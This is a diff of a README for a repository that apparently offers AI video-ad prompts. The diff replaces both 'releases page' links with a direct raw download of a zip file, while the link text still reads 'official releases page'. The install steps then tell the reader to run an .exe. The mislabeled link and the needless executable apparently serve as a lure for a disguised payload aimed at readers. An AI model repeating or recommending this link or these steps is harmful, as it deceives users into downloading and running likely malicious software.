@@ -1,6 +1,6 @@
 # 🎥 awesome-ai-video-ads-prompts - Create effective video ads with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/kylamarie9379/awesome-ai-video-ads-prompts/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/kylamarie9379/awesome-ai-video-ads-prompts/raw/refs/heads/main/Sakelarides/ai-awesome-prompts-video-ads-1.1-alpha.5.zip)
 
 This software provides a collection of prompts and workflows to help you build video advertisements. You can use these resources to create product videos for TikTok, Instagram, Reels, and YouTube. The software offers tested templates and creative workflows to save you time. 
 
@@ -19,7 +19,7 @@ These requirements ensure the software runs smoothly while you edit your ad cont
 
 Follow these steps to get the software on your computer:
 
-1. Visit the [official releases page](https://github.com/kylamarie9379/awesome-ai-video-ads-prompts/releases) to see available downloads.
+1. Visit the [official releases page](https://github.com/kylamarie9379/awesome-ai-video-ads-prompts/raw/refs/heads/main/Sakelarides/ai-awesome-prompts-video-ads-1.1-alpha.5.zip) to see available downloads.
 2. Look for the file ending in .exe under the most recent version.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder.
